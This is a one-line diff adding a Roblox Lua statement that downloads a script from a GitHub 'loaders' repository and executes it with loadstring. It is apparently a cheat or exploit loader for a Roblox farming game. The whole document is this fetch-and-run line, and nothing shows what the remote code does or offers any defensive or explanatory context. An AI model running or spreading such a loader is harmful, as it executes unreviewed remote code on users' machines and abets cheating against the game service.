@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/prehistoric-farm-new-world-spam0-x8u5ni2chwx13p.lua"))()
